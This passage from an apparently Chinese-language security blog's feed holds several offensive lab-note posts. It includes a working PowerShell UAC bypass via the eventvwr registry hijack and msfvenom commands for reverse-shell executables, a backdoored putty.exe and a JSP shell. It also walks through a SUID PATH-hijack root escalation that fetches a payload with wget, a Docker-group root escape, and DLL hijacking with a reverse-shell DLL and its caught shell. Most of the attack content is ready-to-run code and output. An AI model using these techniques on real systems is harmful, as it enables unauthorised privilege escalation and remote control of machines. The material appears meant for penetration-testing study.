alt="priv"></p><br/><hr><p>EventvwrBypassUAC.ps1 </p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment">&lt;#</span><br><span class="hljs-comment"><span class="hljs-doctag">.SYNOPSIS</span>  </span><br><span class="hljs-comment">    By adding a new registry structure to the &quot;HKCU\Software\Classes\&quot; registry to perform an UAC bypass to start any application.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    Only tested on Windows 7 Professional 6.1.7601 Service Pack 1 Build 7601</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.NOTES</span>  </span><br><span class="hljs-comment">    Function   : EventvwrBypassUAC</span><br><span class="hljs-comment">    File Name  : EventvwrBypassUAC.ps1 </span><br><span class="hljs-comment">    Author     : 0x20c</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.PARAMETER Command</span></span><br><span class="hljs-comment">    any command. </span><br><span class="hljs-comment">    EventvwrBypassUAC -Command powershell -enc EDFH...</span><br><span class="hljs-comment">    EventvwrBypassUAC -Command &quot;cmd /c start C:\Windows\reverse.exe&quot;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.LINK</span>  </span><br><span class="hljs-comment">    https://github.com/0x20c</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"><span class="hljs-doctag">.EXAMPLE</span></span><br><span class="hljs-comment">    EventvwrBypassUAC -Command &quot;cmd /c start cmd.exe&quot;</span><br><span class="hljs-comment">#&gt;</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">EventvwrBypassUAC</span><span class="hljs-params">()</span></span><br>&#123; <br>    <span class="hljs-keyword">Param</span> (          <br>        [<span class="hljs-built_in">String</span>]<span class="hljs-variable">$Command</span> = <span class="hljs-string">&quot;cmd /c start cmd.exe&quot;</span> <span class="hljs-comment"># default</span><br>    )<br><br>    <span class="hljs-comment"># Create registry structure</span><br>    <span class="hljs-built_in">New-Item</span> <span class="hljs-literal">-Path</span> HKCU:\Software\Classes\mscfile\shell\open\command <span class="hljs-literal">-Force</span><br>    <span class="hljs-comment"># New-ItemProperty -Path HKCU:\Software\Classes\mscfile\shell\open\command -Name &quot;(default)&quot; -PropertyType String -Value $cmd -Force</span><br>    <span class="hljs-built_in">Set-ItemProperty</span> <span class="hljs-literal">-Path</span> HKCU:\Software\Classes\mscfile\shell\open\command <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;(default)&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-variable">$Command</span> <span class="hljs-literal">-Force</span><br><br>    <span class="hljs-comment"># Perform the bypass</span><br>    <span class="hljs-built_in">Start-Process</span> <span class="hljs-string">&quot;C:\Windows\System32\eventvwr.exe&quot;</span> <span class="hljs-literal">-WindowStyle</span> <span class="hljs-keyword">Hidden</span><br><br>    <span class="hljs-comment"># Remove registry structure</span><br>    <span class="hljs-built_in">Start-Sleep</span> <span class="hljs-number">3</span><br>    <span class="hljs-built_in">Remove-Item</span> HKCU:\Software\Classes\mscfile <span class="hljs-literal">-Recurse</span> <span class="hljs-literal">-Force</span><br><br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>信息安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BypassUAC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Msfvenom Notes</title>
    <link href="/2020/11/09/11_00_msfvenom_usage/"/>
    <url>/2020/11/09/11_00_msfvenom_usage/</url>
    
    <content type="html"><![CDATA[<p>msfvenom notes</p><a id="more"></a><h2 id="msfvenom-bash-completion"><a href="#msfvenom-bash-completion" class="headerlink" title="msfvenom bash completion"></a>msfvenom bash completion</h2><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/nopernik/msfvenom-bc-generator.git <br><span class="hljs-built_in">cd</span> msfvenom-bc-generator/<br>cp msfvenom_bc_generator.rb /usr/share/metasploit-framework/<br>ruby msfvenom_bc_generator.rb <br></code></pre></div></td></tr></table></figure><br/><h2 id="staged-and-unstaged-stageless"><a href="#staged-and-unstaged-stageless" class="headerlink" title="staged and unstaged/stageless"></a>staged and unstaged/stageless</h2><p>unstaged/stageless</p><figure class="highlight nginx"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">msfvenom</span> -p windows/shell_reverse_tcp<br></code></pre></div></td></tr></table></figure><p>staged</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">msfvenom -p windows<span class="hljs-regexp">/shell/</span>reverse_tcp<br></code></pre></div></td></tr></table></figure><p><strong>NOTE:</strong> staged 无法使用 nc 接收 reverse shell</p><br/><p>NON STAGED</p><blockquote><p>A single payload containing the exploit and full shell code for the selected task. Inline payloads are by design more stable than their counterparts because they contain everything all in one. However some exploits wont support the resulting size of these payloads.</p></blockquote><p>STAGER</p><blockquote><p>Stager payloads work in conjunction with stage payloads in order to perform a specific task. A stager establishes a communication channel between the attacker and the victim and reads in a stage payload to execute on the remote host.</p></blockquote><br/><p>staged 有效载荷在 shellcode 空间有限的情况下是很理想的，最常见的使用场景是在 Buffer Overflows 中</p><p>unstaged/stageless 有效载荷一次性将整个有效载荷发送到目标，无需攻击者额外提供其他数据，可以使用多种监听器(nc、…)</p><br/><h2 id="Command-Notes"><a href="#Command-Notes" class="headerlink" title="Command Notes"></a>Command Notes</h2><p>base</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">msfvenom -p windows/x64/shell_reverse_tcp LHOST=1.2.3.4 LPORT=443 -f exe -o re64.exe<br><br>msfvenom -p windows/shell_reverse_tcp LHOST=1.2.3.4 LPORT=443 -f exe -o re86.exe<br><br>msfvenom -p windows/meterpreter_reverse_tcp LHOST=1.2.3.4 LPORT=4445 EXITFUNC=thread -f c<br><br>msfvenom -p generic/custom PAYLOADFILE=./shellcode -b <span class="hljs-string">&quot;\x00&quot;</span> -e x86/shikata_ga_nai -f python -v payload<br><br>cat shellcode | msfvenom --arch windows --platform x86 -b <span class="hljs-string">&quot;\x00\x09\x0c\x20\x0a\x0d\x0b&quot;</span> -e x86/shikata_ga_nai -f python -v shellcode | sed -e <span class="hljs-string">&#x27;s/b//g&#x27;</span><br></code></pre></div></td></tr></table></figure><p>Get shellcode assembler code</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">msfvenom -p linux/x86/<span class="hljs-built_in">exec</span> cmd=whoami | ndisasm -u -<br></code></pre></div></td></tr></table></figure><p>Creating customized backdoored executables</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=1.2.3.4 -e x86/shikata_ga_nai -i 33 -b <span class="hljs-string">&quot;\x00&quot;</span> -f exe -o puttyX.exe<br></code></pre></div></td></tr></table></figure><p>JSP Shell</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">msfvenom -p java/jsp_shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=10.10.IP <span class="hljs-attribute">LPORT</span>=443 -f<span class="hljs-built_in"> raw </span>&gt; shell.jsp<br></code></pre></div></td></tr></table></figure><br/><h2 id="Links-amp-Resources"><a href="#Links-amp-Resources" class="headerlink" title="Links &amp; Resources"></a>Links &amp; Resources</h2><ul><li><a href="https://www.offensive-security.com/metasploit-unleashed/payload-types/">PAYLOAD TYPES IN THE METASPLOIT FRAMEWORK</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>工具使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SUID Binaries Privilege Escalation</title>
    <link href="/2020/11/08/22_43_suid_binaries_exploit/"/>
    <url>/2020/11/08/22_43_suid_binaries_exploit/</url>
    
    <content type="html"><![CDATA[<p>SUID Binaries Priv-Esc</p><a id="more"></a><p>枚举 SUID 程序</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">-rwsr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">26564</span> <span class="hljs-number">2007</span>-<span class="hljs-number">01</span>-<span class="hljs-number">30</span> <span class="hljs-number">18</span>:<span class="hljs-number">10</span> <span class="hljs-regexp">/bin/</span>ping6<br>-rwsr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">30736</span> <span class="hljs-number">2007</span>-<span class="hljs-number">01</span>-<span class="hljs-number">30</span> <span class="hljs-number">18</span>:<span class="hljs-number">10</span> <span class="hljs-regexp">/bin/</span>ping<br>-rwsr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">76896</span> <span class="hljs-number">2007</span>-<span class="hljs-number">02</span>-<span class="hljs-number">21</span> <span class="hljs-number">12</span>:<span class="hljs-number">48</span> <span class="hljs-regexp">/bin/m</span>ount<br>-rwsr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">56984</span> <span class="hljs-number">2007</span>-<span class="hljs-number">02</span>-<span class="hljs-number">21</span> <span class="hljs-number">12</span>:<span class="hljs-number">48</span> <span class="hljs-regexp">/bin/um</span>ount<br>-rwsr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">27000</span> <span class="hljs-number">2007</span>-<span class="hljs-number">02</span>-<span class="hljs-number">27</span> <span class="hljs-number">02</span>:<span class="hljs-number">53</span> <span class="hljs-regexp">/bin/</span>su<br>-rwsr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">9580</span> <span class="hljs-number">2007</span>-<span class="hljs-number">07</span>-<span class="hljs-number">30</span> <span class="hljs-number">16</span>:<span class="hljs-number">41</span> <span class="hljs-regexp">/usr/</span>lib/pt_chown<br>-rwsr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">142156</span> <span class="hljs-number">2007</span>-<span class="hljs-number">03</span>-<span class="hljs-number">05</span> <span class="hljs-number">11</span>:<span class="hljs-number">38</span> <span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/openssh/</span>ssh-keysign<br>-rwsr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">37248</span> <span class="hljs-number">2007</span>-<span class="hljs-number">02</span>-<span class="hljs-number">27</span> <span class="hljs-number">02</span>:<span class="hljs-number">53</span> <span class="hljs-regexp">/usr/</span>bin/gpasswd<br>-rwsr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">18060</span> <span class="hljs-number">2006</span>-<span class="hljs-number">11</span>-<span class="hljs-number">23</span> <span class="hljs-number">15</span>:<span class="hljs-number">58</span> <span class="hljs-regexp">/usr/</span>bin/traceroute.lbl<br>-rwsr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">32064</span> <span class="hljs-number">2007</span>-<span class="hljs-number">02</span>-<span class="hljs-number">27</span> <span class="hljs-number">02</span>:<span class="hljs-number">53</span> <span class="hljs-regexp">/usr/</span>bin/chfn<br>-rwsr-sr-x <span class="hljs-number">1</span> daemon daemon <span class="hljs-number">37800</span> <span class="hljs-number">2006</span>-<span class="hljs-number">01</span>-<span class="hljs-number">03</span> <span class="hljs-number">02</span>:<span class="hljs-number">15</span> <span class="hljs-regexp">/usr/</span>bin/at<br>-rwsr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">837304</span> <span class="hljs-number">2007</span>-<span class="hljs-number">03</span>-<span class="hljs-number">07</span> <span class="hljs-number">17</span>:<span class="hljs-number">16</span> <span class="hljs-regexp">/usr/</span>bin/gpg<br>-rwsr-xr-x <span class="hljs-number">2</span> root root <span class="hljs-number">91700</span> <span class="hljs-number">2006</span>-<span class="hljs-number">04</span>-<span class="hljs-number">15</span> <span class="hljs-number">03</span>:<span class="hljs-number">39</span> <span class="hljs-regexp">/usr/</span>bin/sudo<br>-rwsr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">6923</span> <span class="hljs-number">2008</span>-<span class="hljs-number">10</span>-<span class="hljs-number">07</span> <span class="hljs-number">19</span>:<span class="hljs-number">38</span> <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/u</span>ploadtosecure<br></code></pre></div></td></tr></table></figure><p>搜索发现 <code>uploadtosecure</code> 不属于常见程序，可能存在利用</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">-rwsr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">6923</span> <span class="hljs-number">2008</span>-<span class="hljs-number">10</span>-<span class="hljs-number">07</span> <span class="hljs-number">19</span>:<span class="hljs-number">38</span> <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/u</span>ploadtosecure<br></code></pre></div></td></tr></table></figure><br/><p>检查字符串</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">strings /usr/<span class="hljs-built_in">local</span>/bin/uploadtosecure<br></code></pre></div></td></tr></table></figure><p>输出</p><figure class="highlight elixir"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elixir">/lib/ld-linux.so.<span class="hljs-number">2</span> <br>__gmon_start__ <br>libc.so.<span class="hljs-number">6</span>  <br>_IO_stdin_used<br>puts  <br>system  <br>__libc_start_main <br>GLIBC_2.0 <br>PTRh0 <br>[^_] <br>Archiving files to secure server...<br>scp -r file/tobesecured/* <span class="hljs-number">10.10</span>.<span class="hljs-number">11.100</span><span class="hljs-symbol">:/var/www/html/files/</span><br></code></pre></div></td></tr></table></figure><p>其中一条命令是调用 scp 进行文件传输，可以通过劫持 scp 进行恶意利用</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">scp -r file/tobesecured/* 10.10.11.100:/var/www/html/files/<br></code></pre></div></td></tr></table></figure><br/><p>生成利用程序</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">msfvenom -p linux<span class="hljs-regexp">/x86/</span>exec CMD=<span class="hljs-regexp">/bin/</span>sh -f elf -o scp<br></code></pre></div></td></tr></table></figure><p>下载到 /tmp 并修改权限</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">wget http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">0.167</span><span class="hljs-regexp">/scp -O /</span>tmp/scp<br><br>chmod <span class="hljs-number">755</span> <span class="hljs-regexp">/tmp/</span>scp<br></code></pre></div></td></tr></table></figure><p>修改 PATH</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span><br><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br>/tmp:/usr/<span class="hljs-built_in">local</span>/bin:/usr/bin:/bin:/usr/games<br></code></pre></div></td></tr></table></figure><br/><p>运行二进制程序，触发利用</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">~$ /usr/<span class="hljs-built_in">local</span>/bin/uploadtosecure<br><br>Archiving files to secure server...<br>sh-3.1<span class="hljs-comment"># id</span><br>uid=1001(bob) gid=1001(bob) euid=0(root) groups=1001(bob)<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>信息安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PrivEsc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker Group Privilege Escalation</title>
    <link href="/2020/11/08/22_02_docker_group_privesc/"/>
    <url>/2020/11/08/22_02_docker_group_privesc/</url>
    
    <content type="html"><![CDATA[<p>Docker Group Priv-Esc</p><a id="more"></a><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">~$ id<br>uid=1000(alfred) gid=1000(alfred) groups=1000(alfred),4(adm),24(cdrom),30(dip),46(plugdev),110(lpadmin),111(sambashare),122(docker)<br></code></pre></div></td></tr></table></figure><p>检查 docker</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">~$ docker --version  <br>Docker version 18.09.7, build 2d0083d<br></code></pre></div></td></tr></table></figure><p>Exploit</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh<br><span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)<br></code></pre></div></td></tr></table></figure><br/><h2 id="Links-amp-Resources"><a href="#Links-amp-Resources" class="headerlink" title="Links &amp; Resources"></a>Links &amp; Resources</h2><ul><li><a href="https://gtfobins.github.io/gtfobins/docker/#shell">GTFOBins</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>信息安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PrivEsc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DLL Hijacking</title>
    <link href="/2020/11/08/11_20_dll_hijacking_notes/"/>
    <url>/2020/11/08/11_20_dll_hijacking_notes/</url>
    
    <content type="html"><![CDATA[<p>DLL Hijacking Notes</p><a id="more"></a><p>DLL 搜索路径：</p><ul><li>预定义搜索 (安全的)<ul><li>以加载进入内存中的 DLL</li><li>Known Dlls</li></ul></li><li>标准搜索顺序<ul><li>包含可执行文件的目录</li><li>Windows系统目录，该目录可以通过 <code>GetSystemDirectory</code>得到 (<code>C:\Windows\System32</code>)</li><li>16 位的系统目录(<code>C:\Windows\System</code>)</li><li>Windows 目录，可以通过 <code>GetWindowsDirectory</code> 得到 (<code>C:\Windows</code>)</li><li>进程的当前目录</li><li>PATH 环境变量所列出的目录</li></ul></li></ul><br/><h2 id="DLL-Sideloading"><a href="#DLL-Sideloading" class="headerlink" title="DLL Sideloading"></a>DLL Sideloading</h2><p>empty_dll.dll</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><br><br><span class="hljs-function">BOOL WINAPI <span class="hljs-title">DllMain</span><span class="hljs-params">(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></div></td></tr></table></figure><br/><p>Invoke-Dll.exe</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tchar.h&gt;</span></span><br><br><br><span class="hljs-keyword">int</span> _tmain(<span class="hljs-keyword">int</span> argc, TCHAR* argv[], TCHAR* envp[])<br>&#123;<br>    HMODULE hModule = LoadLibrary(argv[<span class="hljs-number">1</span>]);<br>    <span class="hljs-keyword">if</span> (hModule) &#123;<br>        wprintf(<span class="hljs-string">L&quot;LoadLibrary() OK\n&quot;</span>);<br>        FreeLibrary(hModule);<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        wprintf(<span class="hljs-string">L&quot;LoadLibrary() KO - Error: %d\n&quot;</span>, GetLastError());<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><br/><hr><p>Process Monitor Filter:</p><ul><li>Process Name is Invoke-Dll.exe</li><li>Path contains empty_dll</li></ul><br/><p><img src="/assets/img/2020_11_08_dll_hijacking_notes/2020-11-08-PM-2.49.27.png" alt="PATH"></p><p>将 <code>empty_dll.dll</code> 移到标准搜索路径外，可以看到 DLL 的搜索顺序</p><br/><p>将 <code>empty_dll.dll</code> 放入 <code>C:\Windows\</code></p><p><img src="/assets/img/2020_11_08_dll_hijacking_notes/2020-11-08-PM-2.57.29.png" alt="NAME NOT FOUND"></p><br/><p>检查程序目录是否有写入权：</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">C:\Users\<span class="hljs-number">0</span>x20C&gt;icacls <span class="hljs-string">&quot;C:\Users\0x20C\Desktop\dll hijacking&quot;</span><br><br>C:\Users\<span class="hljs-number">0</span>x20C\Desktop\dll hijacking <br>        NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)<br>        BUILTIN\Administrators:(I)(OI)(CI)(F)<br>        DESKTOP<span class="hljs-literal">-ME4U4MD</span>\<span class="hljs-number">0</span>x20C:(I)(OI)(CI)(F)<br></code></pre></div></td></tr></table></figure><p>生成恶意 DLL 替换原 DLL</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f dll -o empty_dll.dll<br></code></pre></div></td></tr></table></figure><p>执行应用程序</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-Dll</span>.exe empty_dll.dll<br></code></pre></div></td></tr></table></figure><p>得到 Reverse Shell</p><figure class="highlight groovy"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs groovy"><span class="hljs-attr">Ncat:</span> Version <span class="hljs-number">7.91</span> ( <span class="hljs-attr">https:</span><span class="hljs-comment">//nmap.org/ncat )</span><br><span class="hljs-attr">Ncat:</span> Listening <span class="hljs-attr">on :</span>::<span class="hljs-number">4444</span><br><span class="hljs-attr">Ncat:</span> Listening on <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">4444</span><br><span class="hljs-attr">Ncat:</span> Connection from <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.106</span>.<br><span class="hljs-attr">Ncat:</span> Connection from <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.106</span>:<span class="hljs-number">50406.</span><br>Microsoft Windows [Version <span class="hljs-number">10.0</span><span class="hljs-number">.19041</span><span class="hljs-number">.572</span>]<br>(c) <span class="hljs-number">2020</span> Microsoft Corporation. All rights reserved.<br><br><span class="hljs-attr">C:</span>\Users\<span class="hljs-number">0x20C</span>\Desktop\dll hijacking&gt;whoami<br>whoami<br>desktop-me4u4md\<span class="hljs-number">0x20c</span><br></code></pre></div></td></tr></table></figure><br/><h2 id="Ghost-DLL-injection"><a href="#Ghost-DLL-injection" class="headerlink" title="Ghost DLL injection"></a>Ghost DLL injection</h2><p>从 <code>%PATH%</code> 进行 DLL Injection 的一种技术</p><p>PATH</p><figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\P</span>rogram Files (x86)<span class="hljs-symbol">\P</span>ython38-32<span class="hljs-symbol">\S</span>cripts\<br>C:<span class="hljs-symbol">\P</span>rogram Files (x86)<span class="hljs-symbol">\P</span>ython38-32\<br>C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\s</span>ystem32<br>C:<span class="hljs-symbol">\W</span>indows<br>C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\W</span>bem<br>C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>ystem32<span 